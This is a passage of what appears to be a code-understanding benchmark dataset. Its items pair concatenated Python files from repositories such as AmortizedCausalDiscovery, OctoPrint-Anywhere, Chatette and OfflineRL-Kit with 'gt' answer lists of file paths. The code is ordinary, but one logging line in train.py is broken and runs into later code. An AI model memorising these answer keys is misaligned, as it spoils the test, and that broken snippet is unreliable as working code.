n_hid=args.decoder_hidden,\n                do_prob=args.decoder_dropout,\n                skip_first=args.skip_first,\n            )\n        elif args.decoder == \"sim\":\n            decoder = SimulationDecoder(loc_max, loc_min, vel_max, vel_min, args.suffix)\n\n    decoder, num_GPU = utils.distribute_over_GPUs(args, decoder, num_GPU=args.num_GPU)\n\n\n    if args.load_folder:\n        print(\"Loading model file\")\n        args.decoder_file = os.path.join(args.load_folder, \"decoder.pt\")\n        decoder.load_state_dict(torch.load(args.decoder_file, map_location=args.device))\n        args.save_folder = False\n\n    return decoder\n\n\ndef load_model(args, loc_max, loc_min, vel_max, vel_min):\n\n    decoder = load_decoder(args, loc_max, loc_min, vel_max, vel_min)\n\n    if args.use_encoder:\n        encoder = load_encoder(args)\n        edge_probs = None\n        optimizer = optim.Adam(\n            list(encoder.parameters()) + list(decoder.parameters()), lr=args.lr,\n        )\n    else:\n        encoder = None\n        edge_probs = load_distribution(args)\n        optimizer = optim.Adam(\n            [{\"params\": edge_probs, \"lr\": args.lr_z}]\n            + [{\"params\": decoder.parameters(), \"lr\": args.lr}]\n        )\n\n    scheduler = lr_scheduler.StepLR(\n        optimizer, step_size=args.lr_decay, gamma=args.gamma\n    )\n\n    return (\n        encoder,\n        decoder,\n        optimizer,\n        scheduler,\n        edge_probs,\n    )\n\n'AmortizedCausalDiscovery/codebase/train.py'\n:from __future__ import division\nfrom __future__ import print_function\n\nfrom collections import defaultdict\n\nimport time\nimport numpy as np\nimport torch\n\nfrom model.modules import *\nfrom utils import arg_parser, logger, data_loader, forward_pass_and_eval\nfrom model import utils, model_loader\n\n\ndef train():\n    best_val_loss = np.inf\n    best_epoch = 0\n\n    for epoch in range(args.epochs):\n        t_epoch = time.time()\n        train_losses = defaultdict(list)\n\n        for batch_idx, minibatch in enumerate(train_loader):\n\n            data, relations, temperatures = data_loader.unpack_batches(args, minibatch)\n\n            optimizer.zero_grad()\n\n            losses, _, _, _ = forward_pass_and_eval.forward_pass_and_eval(\n                args,\n                encoder,\n                decoder,\n                data,\n                relations,\n                rel_rec,\n                rel_send,\n                args.hard,\n                edge_probs=edge_probs,\n                log_prior=log_prior,\n                temperatures=temperatures,\n            )\n\n            loss = losses[\"loss\"]\n\n            loss.backward()\n            optimizer.step()\n\n            train_losses = utils.append_losses(train_losses, losses)\n\n        string = logs.result_string(\"train\", epoch, train_losses, t=t_epoch)\n        logs.write_to_log_file(string)\n        logs.append_train_loss(train_losses)\n        scheduler.step()\n\n        if args.validate:\n            val_losses = val(epoch)\n            val_loss = np.mean(val_losses[\"loss\"])\n            if val_loss < best_val_loss:\n                print(\"Best model so far, saving...\")\n                logs.create_log(\n                    args,\n                    encoder=encoder,\n                    decoder=decoder,\n                    optimizer=optimizer,\n                    accuracy=np.mean(val_losses[\"acc\"]),\n                )\n                best_val_loss = val_loss\n                best_epoch = epoch\n        elif (epoch + 1) % 100 == 0:\n            logs.create_log(\n                args,\n                encoder=encoder,\n                decoder=decoder,\n                optimizer=optimizer,\n                accuracy=np.mean(train_losses[\"acc\"]),\n            )\n\n        logs.draw_loss_curves()\n\n    return best_epoch, epoch\n\n\ndef val(epoch):\n    t_val = time.time()\n    val_losses = defaultdict(list)\n\n    if args.use_encoder:\n        encoder.eval()\n    decoder.eval()\n\n    for batch_idx, minibatch in enumerate(valid_loader):\n\n        data, relations, temperatures = data_loader.unpack_batches(args, minibatch)\n\n        with torch.no_grad():\n            losses, _, _, _ = forward_pass_and_eval.forward_pass_and_eval(\n                args,\n                encoder,\n                decoder,\n                data,\n                relations,\n                rel_rec,\n                rel_send,\n                True,\n                edge_probs=edge_probs,\n                log_prior=log_prior,\n                testing=True,\n                temperatures=temperatures,\n            )\n\n        val_losses = utils.append_losses(val_losses, losses)\n\n    string = logs.result_string(\"validate\", epoch, val_losses, t=t_val)\n    logs.write_to_log_file(string)\n    logs.append_val_loss(val_losses)\n\n    if args.use_encoder:\n        encoder.train()\n    decoder.train()\n\n    return val_losses\n\n\ndef test(encoder, decoder, epoch):\n    args.shuffle_unobserved = False\n\n    test_losses = defaultdict(list)\n\n    if args.load_folder == \"\":\n\n        if args.use_encoder:\n            encoder.load_state_dict(torch.load(args.encoder_file))\n        decoder.load_state_dict(torch.load(args.decoder_file))\n\n    if args.use_encoder:\n        encoder.eval()\n    decoder.eval()\n\n    for batch_idx, minibatch in enumerate(test_loader):\n\n        data, relations, temperatures = data_loader.unpack_batches(args, minibatch)\n\n        with torch.no_grad():\n            assert (data.size(2) - args.timesteps) >= args.timesteps\n\n            data_encoder = data[:, :, : args.timesteps, :].contiguous()\n            data_decoder = data[:, :, args.timesteps : -1, :].contiguous()\n\n            losses, _, _, _, = forward_pass_and_eval.forward_pass_and_eval(\n                args,\n                encoder,\n                decoder,\n                data,\n                relations,\n                rel_rec,\n                rel_send,\n                True,\n                data_encoder=data_encoder,\n                data_decoder=data_decoder,\n                edge_probs=edge_probs,\n                log_prior=log_prior,\n                testing=True,\n                temperatures=temperatures,\n            )\n\n        test_losses = utils.append_losses(test_losses, losses)\n\n    string = logs.result_string(\"test\", epoch, test_losses)\n    logs.write_to_log_file(string)\n    logs.append_test_loss(test_losses)\n\n    logs.create_log(\n        args,\n        decoder=decoder,\n        encoder=encoder,\n        optimizer=optimizer,\n        final_test=True,\n        test_losses=test_losses,\n    )\n\n\nif __name__ == \"__main__\":\n\n    args = arg_parser.parse_args()\n    logs = logger.Logger(args)\n\n    if args.GPU_to_use is not None:\n        logs.write_to_log_file(\"Using GPU\n\n    (\n        train_loader,\n        valid_loader,\n        test_loader,\n        loc_max,\n        loc_min,\n        vel_max,\n        vel_min,\n    ) = data_loader.load_data(args)\n\n    rel_rec, rel_send = utils.create_rel_rec_send(args, args.num_atoms)\n\n    encoder, decoder, optimizer, scheduler, edge_probs = model_loader.load_model(\n        args, loc_max, loc_min, vel_max, vel_min\n    )\n\n    logs.write_to_log_file(encoder)\n    logs.write_to_log_file(decoder)\n\n    if args.prior != 1:\n        assert 0 <= args.prior <= 1, \"args.prior not in the right range\"\n        prior = np.array(\n            [args.prior]\n            + [\n                (1 - args.prior) / (args.edge_types - 1)\n                for _ in range(args.edge_types - 1)\n            ]\n        )\n        logs.write_to_log_file(\"Using prior\")\n        logs.write_to_log_file(prior)\n        log_prior = torch.FloatTensor(np.log(prior))\n        log_prior = log_prior.unsqueeze(0).unsqueeze(0)\n\n        if args.cuda:\n            log_prior = log_prior.cuda()\n    else:\n        log_prior = None\n\n    if args.global_temp:\n        args.categorical_temperature_prior = utils.get_categorical_temperature_prior(\n            args.alpha, args.num_cats, to_cuda=args.cuda\n        )\n\n\n    try:\n        if args.test_time_adapt:\n            raise KeyboardInterrupt\n\n        best_epoch, epoch = train()\n\n    except KeyboardInterrupt:\n        best_epoch, epoch = -1, -1\n\n    print(\"Optimization Finished!\")\n    logs.write_to_log_file(\"Best Epoch: {:04d}\".format(best_epoch))\n\n    if args.test:\n        test(encoder, decoder, epoch)\n",
        "gt": [
            "'AmortizedCausalDiscovery/codebase/model/MLPEncoder.py'",
            "'AmortizedCausalDiscovery/codebase/model/EncoderGlobalTemp.py'",
            "'AmortizedCausalDiscovery/codebase/model/model_loader.py'",
            "'AmortizedCausalDiscovery/codebase/train.py'"
        ]
    },
    {
        "files": [
            "'OctoPrint-Anywhere/octoprint_anywhere/remote_status.py'",
            "'OctoPrint-Anywhere/octoprint_anywhere/__init__.py'",
            "'OctoPrint-Anywhere/octoprint_anywhere/message_loop.py'"
        ],
        "content": "'OctoPrint-Anywhere/octoprint_anywhere/remote_status.py'\n:\nfrom __future__ import absolute_import\nimport threading\n\nclass RemoteStatus:\n\n    def __init__(self):\n        self._mutex = threading.RLock()\n        self.__items__ = {\"watching\": False, \"burst_count\": 0}\n\n    def __getitem__(self, key):\n        with self._mutex:\n            return self.__items__[key]\n\n    def __setitem__(self, key, value):\n        with self._mutex:\n            self.__items__[key] = value\n\n'OctoPrint-Anywhere/octoprint_anywhere/__init__.py'\n:\nfrom __future__ import absolute_import\n\nimport octoprint.plugin\n\nimport os\nimport threading\nimport time\nimport requests\nimport backoff\nfrom raven import breadcrumbs\nimport logging\n\nfrom .message_loop import MessageLoop\nfrom .config import Config\n\n_logger = logging.getLogger('octoprint.plugins.anywhere')\n\nPRINTQ_FOLDER = \"OctoPrint-Anywhere\"\n\nclass AnywherePlugin(octoprint.plugin.SettingsPlugin,\n                     octoprint.plugin.AssetPlugin,\n                     octoprint.plugin.EventHandlerPlugin,\n                     octoprint.plugin.TemplatePlugin,\n                     octoprint.plugin.StartupPlugin,\n                     octoprint.plugin.ShutdownPlugin,\n                     octoprint.plugin.SimpleApiPlugin,\n                     octoprint.plugin.WizardPlugin,):\n\n    def __init__(self):\n        self.current_gcodefile_id = None\n\n\n    def get_assets(self):\n        return dict(\n                js=[\"js/anywhere.js\"]\n                )\n\n\n\n\n\n    def is_wizard_required(self):\n        return not self.get_config()['registered']\n\n    def get_wizard_version(self):\n        return 4\n\n\n\n\n\n\n\n\n\n\n    def get_api_commands(self):\n        return dict(\n            reset_config=[],\n            get_config=[],\n        )\n\n    def is_api_adminonly(self):\n        return True\n\n    def on_api_command(self, command, data):\n        import flask\n        if command == \"reset_config\":\n            old_token = self.get_config()['token']\n            self.get_config().reset_config()\n            return flask.jsonify(reg_url=\"{0}/pub/link_printer?token={1}&copy_from={2}\".format(self.get_config()['api_host'], self.get_config()['token'], old_token), registered=self.get_config()['registered'])\n        elif command == \"get_config\":\n            conf = self.get_config().as_dict()\n            conf.update(dict(picamera_error=self.config.picamera_error()))\n            return flask.jsonify(conf)\n\n    def get_update_information(self):\n\n\n\n        return dict(\n            anywhere=dict(\n                displayName=\"OctoPrint Anywhere\",\n                displayVersion=self._plugin_version,\n\n\n                type=\"github_release\",\n                user=\"kennethjiang\",\n                repo=\"OctoPrint-Anywhere\",\n                current=self._plugin_version,\n\n\n                pip=\"https://github.com/kennethjiang/OctoPrint-Anywhere/archive/{target_version}.zip\"\n            )\n        )\n\n    def on_startup(self, host, port):\n        self.octoprint_port = port if port else self._settings.getInt([\"server\", \"port\"])\n\n    def on_after_startup(self):\n        self.get_config()\n        self.__ensure_storage__()\n        self.start_main_thread()\n\n\n\n\n    def on_event(self, event, payload):\n\n        if not hasattr(self, 'main_loop') or not hasattr(self, 'config') or not self.get_config()['registered']:\n            return\n\n        if event.startswith(\"Print\"):\n\n            if self.current_gcodefile_id:\n                payload['gcodefile_id'] = self.current_gcodefile_id\n\n            if event == 'PrintFailed' or event == 'PrintDone':\n                self.current_gcodefile_id = None\n\n            self.main_loop.send_octoprint_data(event, payload)\n\n\n\n\n    def get_config(self):\n        try:\n            return self.config\n        except AttributeError:\n            self.config = Config(self)\n            return self.config\n\n    def start_main_thread(self):\n        try:\n            main_thread = threading.Thread(target=self.__run_message_loop__)\n            main_thread.daemon = True\n            main_thread.start()\n        except:\n            self.get_config().sentry.captureException()\n            import traceback; traceback.print_exc()\n\n    def __run_message_loop__(self):\n\n        if (not self.get_config()['registered']):\n            self.__probe_auth_token__()\n            self.get_config()['registered'] = True\n\n        dev_settings = self.__get_dev_settings__()\n        _logger.warning(dev_settings)\n        self.get_config().set_dev_settings(dev_settings)\n\n        self.main_loop = MessageLoop(self.get_config(), self)\n        self.main_loop.run_until_quit()\n\n    @backoff.on_exception(backoff.expo, Exception, max_value=300)\n    def __get_dev_settings__(self):\n        r = requests.get(self.config['stream_host'] + \"/api/dev_settings\", headers={\"Authorization\": \"Bearer \" + self.config['token']})\n        r.raise_for_status()\n        return r.json()\n\n    def __probe_auth_token__(self):\n        while True:\n            try:\n                requests.get(self.get_config()['stream_host'] + \"/api/ping\", headers={\"Authorization\": \"Bearer \" + self.get_config()['token']}).raise_for_status()\n                return\n            except:\n                time.sleep(5)\n\n    def start_print(self, print_to_start):\n        self._logger.warning('Received print command for gcodfile_id: {} '.format(print_to_start['id']))\n        self.current_gcodefile_id = print_to_start['id']\n        file_url = print_to_start['url']\n        file_name = print_to_start['filename']\n        print_thread = threading.Thread(target=self.__download_and_print__, args=(file_url, file_name))\n        print_thread.daemon = True\n        print_thread.start()\n\n    def __download_and_print__(self, file_url, file_name):\n        self.main_loop.send_octoprint_data('DownloadStarted', {'gcodefile_id': self.current_gcodefile_id})\n        r = requests.get(file_url, allow_redirects=True)\n        r.raise_for_status()\n        target_path = os.path.join(self._g_code_folder, file_name)\n        open(target_path, \"wb\").write(r.content)\n        self._logger.warning('Finished downloading to target_path: {}'.format(target_path))\n        self._printer.select_file(target_path, False, printAfterSelect=True)\n\n    def __ensure_storage__(self):\n        self._file_manager.add_folder(\"local\", PRINTQ_FOLDER, ignore_existing=True)\n        self._g_code_folder = self._file_manager.path_on_disk(\"local\", PRINTQ_FOLDER)\n\n\n\n\n\n__plugin_name__ = \"OctoPrint Anywhere\"\n__plugin_pythoncompat__ = \">=2.7,<4\"\n\ndef __plugin_load__():\n    global __plugin_implementation__\n    __plugin_implementation__ = AnywherePlugin()\n\n    global __plugin_hooks__\n    __plugin_hooks__ = {\n        \"octoprint.plugin.softwareupdate.check_config\": __plugin_implementation__.get_update_information\n    }\n\n\n'OctoPrint-Anywhere/octoprint_anywhere/message_loop.py'\n:\nfrom __future__ import absolute_import\n\nimport threading\nimport requests\nimport time\nimport json\nimport logging\nimport os\nimport sys\nfrom raven import breadcrumbs\n\nfrom .mjpeg_stream import MjpegStream\nfrom .h264_stream import H264Streamer\nfrom .timelapse import Timelapse\nfrom .server_ws import ServerSocket\nfrom .remote_status import RemoteStatus\nfrom .utils import ip_addr, ExpoBackoff, pi_version\n\n_logger = logging.getLogger('octoprint.plugins.anywhere')\n__python_version__ = 3 if sys.version_info >= (3, 0) else 2\n\nclass MessageLoop:\n\n    def __init__(self, config, plugin):\n        self._mutex = threading.RLock()\n        self.config = config\n        self.plugin = plugin\n\n        self.remote_status = RemoteStatus()\n\n        self.ss = None\n        self.mjpeg_stream = None\n        self.timelapse_uploader = None\n        self.op_info = None\n        self.h264_stream = None\n\n    def run_until_quit(self):\n        try:\n            stream_host = self.config['stream_host']\n            token = self.config['token']\n\n            if self.config.premium_video_eligible():\n                _logger.warning('Printer is eligible for premium video streaming.')\n                if pi_version() or os.environ.get('CAM_SIM', False):\n                    self.h264_stream = H264Streamer(stream_host, token, self.config.sentry)\n                    h264_stream_thread = threading.Thread(target=self.h264_stream.start_hls_pipeline, args=(self.remote_status, self.plugin, self.config.dev_settings))\n                    h264_stream_thread.daemon = True\n                    h264_stream_thread.start()\n                else:\n                    _logger.error('Premium video is enabled on a non-RPi platform: ')\n                    self.config.sentry.captureMessage('Premium video is enabled on a non-RPi platform: {}'.format(self.config['token']))\n\n            self.mjpeg_stream = MjpegStream()\n            mjpeg_stream_thread = threading.Thread(target=self.mjpeg_stream.stream_up, args=(stream_host, token, self.plugin._printer, self.remote_status, self.plugin._settings.global_get([\"webcam\"]), self.config))\n            mjpeg_stream_thread.daemon = True\n            mjpeg_stream_thread.start()\n\n            self.timelapse_uploader = Timelapse()\n            timelapse_upload_thread = threading.Thread(target=self.timelapse_uploader.upload_timelapses, args=(stream_host, token, self.plugin._settings.settings.getBaseFolder(\"timelapse\")))\n            timelapse_upload_thread.daemon = True\n            timelapse_upload_thread.start()\n\n            self.__send_loop__()\n        except:\n            self.config.sentry.captureException()\n            import traceback; traceback.print_exc()\n\n    def __send_loop__(self):\n        last_heartbeat = 0\n\n        backoff = ExpoBackoff(1200)\n        while True:\n            try:\n                self.ss = ServerSocket(self.config['ws_host'] + \"/app/ws/device\", self.config['token'], on_server_ws_msg=self.__on_server_ws_msg__)\n                wst = threading.Thread(target=self.ss.run)\n                wst.daemon = True\n                wst.start()\n                time.sleep(2)\n\n                while self.ss.connected():\n                    breadcrumbs.record(message=\"Message loop for: \" + self.config['token'])\n                    if time.time() - last_heartbeat > 60:\n                        self.__send_heartbeat__()\n                        last_heartbeat = time.time()\n\n                    self.send_octoprint_data()\n                    backoff.reset()\n                    time.sleep(10)\n\n            finally:\n                try:\n                    self.ss.disconnect()\n                except:\n                    pass\n                backoff.more()\n\n    def __on_server_ws_msg__(self, ws, msg):\n\n        def __process_job_cmd__(cmd):\n            if cmd == 'pause':\n                self.plugin._printer.pause_print()\n            elif cmd == 'cancel':\n                self.plugin._printer.cancel_print()\n            elif cmd == 'resume':\n                self.plugin._printer.resume_print()\n            elif isinstance(cmd, dict) and 'start' in cmd:\n                self.plugin.start_print(cmd['start'])\n\n        def __process_temps_cmd__(cmd):\n            if 'set' in cmd:\n                self.plugin._printer.set_temperature(cmd['set']['heater'], cmd['set']['target'])\n\n        def __process_jog_cmd__(cmd):\n            self.remote_status['burst_count'] = 5\n            axis = list(cmd.keys())[0]\n            if isinstance(cmd[axis], int):\n                self.plugin._printer.jog(cmd)\n            else:\n                self.plugin._printer.home(axis)\n\n        def __process_cmd__(cmd):\n            for k, v in cmd.items():\n                if k == 'job':\n                    __process_job_cmd__(v)\n                if k == 'temps':\n                    __process_temps_cmd__(v)\n                    time.sleep(0.1)\n                    self.send_octoprint_data()\n                if k == 'jog':\n                    __process_jog_cmd__(v)\n                if k == 'watching':\n                    self.remote_status['watching'] = v == 'True'\n\n\n\n        msgDict = json.loads(msg)\n        for k, v in msgDict.items():\n            if k == 'cmd':\n                __process_cmd__(v)\n\n\n    def send_octoprint_data(self, event_type=None, event_payload=None):\n        if not self.ss:\n            return\n\n        try:\n            data = self.plugin._printer.get_current_data()\n            data['temps'] = self.plugin._printer.get_current_temperatures()\n            data['origin'] = 'octoprint'\n            if event_type:\n                data['type'] = event_type\n                data['payload'] = event_payload\n\n            self.ss.send_text(json.dumps(data))\n        except:\n            self.config.sentry.captureException()\n            import traceback; traceback.print_exc()\n\n    def __send_heartbeat__(self):\n        try:\n            if not self.op_info:\n                self.op_info = self.__gather_op_info__()\n\n            data = {\n                'hb': {\n                    'ipAddrs': self.op_info['ip_addrs'],\n                    'port': self.plugin.octoprint_port,\n                    'settings': self.op_info['settings'],\n                    'octolapse': self.op_info['octolapse'],\n                },\n                'origin': 'oa',\n                'oaVersion': self.plugin._plugin_version\n            }\n            if __python_version__ == 3:\n                self.ss.send_text(json.dumps(data, default=str))\n            else:\n                self.ss.send_text(json.dumps(data, encoding='iso-8859-1', default=str))\n        except:\n            self.config.sentry.captureException()\n            import traceback; traceback.print_exc()\n\n    def __gather_op_info__(self):\n        octolapse = self.plugin._plugin_manager.get_plugin_info('octolapse')\n        return {\n                'ip_addrs': ip_addr(),\n                'octolapse': {'version': octolapse.version, 'enabled': octolapse.enabled} if octolapse else None,\n                'settings': {\n                        'temperature': self.plugin._settings.settings.effective['temperature']\n                    }\n                }\n\n    def __download_and_print__(self, file_url, file_name):\n        r = requests.get(file_url, allow_redirects=True)\n        r.raise_for_status()\n        target_path = os.path.join(self._g_code_folder, file_name)\n        open(target_path, \"wb\").write(r.content)\n        self.plugin._printer.select_file(target_path, False, printAfterSelect=True)\n",
        "gt": [
            "'OctoPrint-Anywhere/octoprint_anywhere/remote_status.py'",
            "'OctoPrint-Anywhere/octoprint_anywhere/message_loop.py'",
            "'OctoPrint-Anywhere/octoprint_anywhere/__init__.py'"
        ]
    },
    {
        "files": [
            "'Chatette/chatette/cli/interactive_commands/exit_command.py'",
            "'Chatette/chatette/cli/interpreter.py'",
            "'Chatette/chatette/__main__.py'"
        ],
        "content": "'Chatette/chatette/cli/interactive_commands/exit_command.py'\n:\n\nfrom chatette.cli.interactive_commands.command_strategy import CommandStrategy\n\n\nclass ExitCommand(CommandStrategy):\n\n    def execute(self):\n        pass\n\n    def should_exit(self):\n        return True\n\n\n\n    def execute_on_unit(self, unit_type, unit_name, variation_name=None):\n        raise NotImplementedError()\n    def finish_execution(self):\n        raise NotImplementedError()\n\n'Chatette/chatette/cli/interpreter.py'\n:\n\nfrom __future__ import print_function\nimport io\nfrom six.moves import input\n\nfrom chatette import __version__\nfrom chatette.utils import Singleton\nfrom chatette.facade import Facade\n\nfrom chatette.cli.interactive_commands import \\\n    exit_command, stats_command, parse_command, exist_command, rename_command, \\\n    delete_command, examples_command, hide_command, unhide_command, \\\n    execute_command, show_command, rule_command, generate_command, \\\n    add_rule_command, declare_command, set_modifier_command, save_command\n\n\nclass CommandLineInterpreter(Singleton):\n    _instance = None\n    def __init__(self, args):\n        commands_file_path = args.interactive_commands_file\n        self._dont_enter_interactive_mode = True\n        if args.input is None:\n            self.facade = None\n        else:\n            self.facade = Facade.get_or_create_from_args(args)\n\n        self.introduce()\n        if commands_file_path is not None:\n            self._dont_enter_interactive_mode = \\\n                self._execute_commands_file(commands_file_path)\n        else:\n            self._dont_enter_interactive_mode = False\n\n\n\n    def _execute_commands_file(self, commands_file_path):\n\n        print(\"Executing commands from file \" + commands_file_path)\n        stop = False\n        with io.open(commands_file_path, 'r', encoding=\"utf-8\") as f:\n            for l in f:\n                if not l.isspace() and not l.lstrip().startswith(\"//\"):\n                    stop = self.interpret_command(l.rstrip(), quiet=True)\n                    if stop:\n                        break\n        print(\"Execution of file over.\")\n        return stop\n\n\n    def introduce(self):\n\n        print(\"Chatette v\"+__version__+\" running in *interactive mode*.\")\n        if self.facade is not None:\n            self.facade.run_parsing()\n\n    def wait_for_input(self):\n\n        if self._dont_enter_interactive_mode:\n            return\n        while True:\n            print(\">>> \", end='')\n            try:\n                command_str = input()\n            except EOFError:\n                print(\"Exiting interactive mode\")\n                break\n            if self.interpret_command(command_str):\n                print(\"Exiting interactive mode\")\n                break\n\n    def interpret_command(self, command_str, quiet=False):\n\n        if command_str == \"\" or command_str.isspace():\n            return False\n        command = CommandLineInterpreter.get_command(command_str, quiet)\n        if command is None:\n            return False\n        if command.should_exit():\n            return True\n        result = command.execute()\n        if isinstance(command, execute_command.ExecuteCommand):\n            self.execute_commands(result)\n        command.flush_output()\n        return False\n\n    def execute_commands(self, commands):\n\n        if commands is None:\n            return False\n        for cmd in commands:\n            stop = self.interpret_command(cmd)\n            if stop:\n                return True\n        return False\n\n\n    @staticmethod\n    def get_command(command_str, quiet):\n\n        try:\n            operation_name = command_str.split(maxsplit=1)[0].lower()\n        except TypeError:\n            operation_name = command_str.split(None, 1)[0].lower()\n        if operation_name == \"exit\":\n            return exit_command.ExitCommand(command_str, quiet)\n        if operation_name == \"stats\":\n            return stats_command.StatsCommand(command_str, quiet)\n        if operation_name == \"parse\":\n            return parse_command.ParseCommand(command_str, quiet)\n        if operation_name == \"exist\":\n            return exist_command.ExistCommand(command_str, quiet)\n        if operation_name == \"rename\":\n            return rename_command.RenameCommand(command_str, quiet)\n        if operation_name == \"delete\":\n            return delete_command.DeleteCommand(command_str, quiet)\n        if operation_name == \"examples\":\n            return examples_command.ExamplesCommand(command_str, quiet)\n        if operation_name == \"hide\":\n            return hide_command.HideCommand(command_str, quiet)\n        if operation_name == \"unhide\":\n            return unhide_command.UnhideCommand(command_str, quiet)\n        if operation_name == \"execute\":\n            return execute_command.ExecuteCommand(command_str, quiet)\n        if operation_name == \"show\":\n            return show_command.ShowCommand(command_str, quiet)\n        if operation_name == \"rule\":\n            return rule_command.RuleCommand(command_str, quiet)\n        if operation_name == \"generate\":\n            return generate_command.GenerateCommand(command_str, quiet)\n        if operation_name == \"add-rule\":\n            return add_rule_command.AddRuleCommand(command_str, quiet)\n        if operation_name == \"declare\":\n            return declare_command.DeclareCommand(command_str, quiet)\n        if operation_name == \"set-modifier\":\n            return set_modifier_command.SetModifierCommand(command_str, quiet)\n        if operation_name == \"save\":\n            return save_command.SaveCommand(command_str, quiet)\n        if not quiet:\n            print(\"Unknown command: \" + operation_name)\n        return None\n\n'Chatette/chatette/__main__.py'\n:\n\n\nimport argparse\nimport sys\n\nfrom chatette import __version__, prechecks\nfrom chatette.facade import Facade\nfrom chatette.cli.interpreter import CommandLineInterpreter\n\n\ndef main():\n    argument_parser = make_argument_parser()\n    if len(sys.argv[1:]) == 0:\n        argument_parser.print_help()\n        argument_parser.exit()\n\n    args = argument_parser.parse_args()\n\n    prechecks.ensure_preconditions()\n    prechecks.check_for_deprecations()\n\n    if not args.interactive_mode and args.interactive_commands_file is None:\n        facade = Facade.get_or_create_from_args(args)\n        facade.run()\n    else:\n        cli = CommandLineInterpreter(args)\n        cli.wait_for_input()\n\n\ndef make_argument_parser():\n\n    argument_parser = argparse.ArgumentParser(\n        description=\"Chatette v\" + __version__ + \" -- \" +\n                    \"Generates NLU datasets from template files\",\n        epilog=\"SimGus -- 2018 -- Released under MIT license\",\n        prog=\"Chatette\",\n        add_help=True\n    )\n\n    _add_positional_arguments(\n        argument_parser, (\"-i\" in sys.argv or \"--interactive\" in sys.argv)\n    )\n\n    argument_parser.add_argument(\n        \"-v\", \"--version\", action=\"version\", version=\"%(prog)s v\" + __version__,\n        help=\"Print the version number of the module\"\n    )\n    _add_optional_arguments(argument_parser)\n\n    return argument_parser\n\n\ndef _add_positional_arguments(argument_parser, should_be_optional=False):\n    if should_be_optional:\n        argument_parser.add_argument(\n            \"input\", type=str,\n            nargs=\"?\",\n            help=\"Path to master template file\"\n        )\n    else:\n        argument_parser.add_argument(\n            \"input\", type=str,\n            help=\"Path to master template file\"\n        )\n\n\ndef _add_optional_arguments(argument_parser):\n    argument_parser.add_argument(\n        \"-o\", \"--out\", dest=\"output\", required=False, type=str, default=None,\n        help=\"Output directory path\"\n    )\n    argument_parser.add_argument(\n        \"-l\", \"--local\", dest=\"local\", required=False,\n        action=\"store_true\", default=False,\n        help=\"Change the base directory for output files \" + \\\n             \"from the current working directory to the directory containing \" + \\\n             \"the template file\"\n    )\n    argument_parser.add_argument(\n        \"-a\", \"--adapter\", dest=\"adapter\", required=False,\n        type=str, default=\"rasa\",\n        help=\"Write adapter. \" + \\\n             \"Possible values: ['rasa', 'rasamd' or 'rasa-md', 'jsonl']\"\n    )\n    argument_parser.add_argument(\n        \"--base-file\", dest=\"base_filepath\",\n        required=False, type=str, default=None,\n        help=\"Path to base file to extend with examples and synonyms. \" + \\\n             \"Only with Rasa adapter.\"\n    )\n    argument_parser.add_argument(\n        \"-s\", \"--seed\", dest=\"seed\",\n        required=False, type=str, default=None,\n        help=\"Seed for the random generator (any string \" + \\\n             \"without spaces will work)\"\n    )\n    argument_parser.add_argument(\n        \"-i\", \"--interactive\", dest=\"interactive_mode\",\n        required=False, action=\"store_true\", default=False,\n        help=\"Runs Chatette in interactive mode\"\n    )\n    argument_parser.add_argument(\n        \"-I\", \"--interactive-commands-file\", dest=\"interactive_commands_file\",\n        required=False, default=None, type=str,\n        help=\"Path to a file containing interactive mode commands \" + \\\n             \"that will be directly run\"\n    )\n    argument_parser.add_argument(\n        \"-f\", \"--force\", dest=\"force\",\n        required=False, action=\"store_true\", default=False,\n        help=\"Don't ask for confirmation before overwriting files and folders\"\n    )\n\n\nif __name__ == \"__main__\":\n    main()\n",
        "gt": [
            "'Chatette/chatette/cli/interactive_commands/exit_command.py'",
            "'Chatette/chatette/cli/interpreter.py'",
            "'Chatette/chatette/__main__.py'"
        ]
    },
    {
        "files": [
            "'OfflineRL-Kit/offlinerlkit/policy/base_policy.py'",
            "'OfflineRL-Kit/run_example/run_rambo.py'",
            "'OfflineRL-Kit/offlinerlkit/policy/__init__.py'"
        ],
        "content": "'OfflineRL-Kit/offlinerlkit/policy/base_policy.py'\n:import numpy as np\nimport torch\nimport torch.nn as nn\n\nfrom typing import Dict, Union\n\n\nclass BasePolicy(nn.Module):\n    def __init__(self) -> None:\n        super().__init__()\n\n    def train() -> None:\n        raise NotImplementedError\n\n    def eval() -> None:\n        raise NotImplementedError\n\n    def select_action(\n        self,\n        obs: np.ndarray,\n        deterministic: bool = False\n    ) -> np.ndarray:\n        raise NotImplementedError\n\n    def learn(self, batch: Dict) -> Dict[str, float]:\n        raise NotImplementedError\n'OfflineRL-Kit/run_example/run_rambo.py'\n:import argparse\nimport random\n\nimport gym\nimport d4rl\n\nimport numpy as np\nimport torch\n\n\nfrom offlinerlkit.nets import MLP\nfrom offlinerlkit.modules import ActorProb, Critic, TanhDiagGaussian, EnsembleDynamicsModel\nfrom offlinerlkit.dynamics import EnsembleDynamics\nfrom offlinerlkit.utils.scaler import StandardScaler\nfrom offlinerlkit.utils.termination_fns import get_termination_fn, obs_unnormalization\nfrom offlinerlkit.buffer import ReplayBuffer\nfrom offlinerlkit.utils.logger import Logger, make_log_dirs\nfrom offlinerlkit.policy_trainer import MBPolicyTrainer\nfrom offlinerlkit.policy import RAMBOPolicy\n\n\n\n\n\ndef get_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--algo-name\", type=str, default=\"rambo\")\n    parser.add_argument(\"--task\", type=str, default=\"hopper-medium-v2\")\n    parser.add_argument(\"--seed\", type=int, default=0)\n    parser.add_argument(\"--actor-lr\", type=float, default=1e-4)\n    parser.add_argument(\"--critic-lr\", type=float, default=3e-4)\n    parser.add_argument(\"--dynamics-lr\", type=float, default=3e-4)\n    parser.add_argument(\"--dynamics-adv-lr\", type=float, default=3e-4)\n    parser.add_argument(\"--hidden-dims\", type=int, nargs='*', default=[256, 256])\n    parser.add_argument(\"--gamma\", type=float, default=0.99)\n    parser.add_argument(\"--tau\", type=float, default=0.005)\n    parser.add_argument(\"--alpha\", type=float, default=0.2)\n    parser.add_argument(\"--auto-alpha\", default=True)\n    parser.add_argument(\"--target-entropy\", type=int, default=None)\n    parser.add_argument(\"--alpha-lr\", type=float, default=1e-4)\n\n    parser.add_argument(\"--dynamics-hidden-dims\", type=int, nargs='*', default=[200, 200, 200, 200])\n    parser.add_argument(\"--dynamics-weight-decay\", type=float, nargs='*', default=[2.5e-5, 5e-5, 7.5e-5, 7.5e-5, 1e-4])\n    parser.add_argument(\"--n-ensemble\", type=int, default=7)\n    parser.add_argument(\"--n-elites\", type=int, default=5)\n    